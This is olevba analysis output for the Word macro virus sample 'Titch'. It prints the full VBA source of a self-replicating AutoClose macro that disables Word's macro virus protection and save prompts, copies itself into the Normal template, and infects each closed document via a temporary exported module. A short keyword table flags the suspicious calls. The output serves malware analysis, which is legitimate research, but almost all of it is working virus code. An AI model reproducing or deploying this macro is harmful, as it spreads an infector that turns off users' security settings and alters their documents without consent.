olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titch
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titch - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO titch.bas 
in file: ./Virus.MSWord.Titch - OLE stream: 'Macros/VBA/titch'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Titch
'An experiment in Macro programming ;)
'Minimum stealth, no encryption, No payload, No mail replication
'If you had looked you could have found and deleted it but..
'You probably never knew it was here!
  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  Dim x As Integer
  Dim found As Boolean
  found = False
  x = 1
  For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'Titch" Then found = True
  Next x
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "titch", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  x = 1
  For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'Titch" Then found = True
  Next x
  If Not found Then
    NormalTemplate.VBProject.VBComponents("titch").Export ("c:\titch.tmp")
    ActiveDocument.VBProject.VBComponents.Import ("c:\titch.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\titch.tmp")
  End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

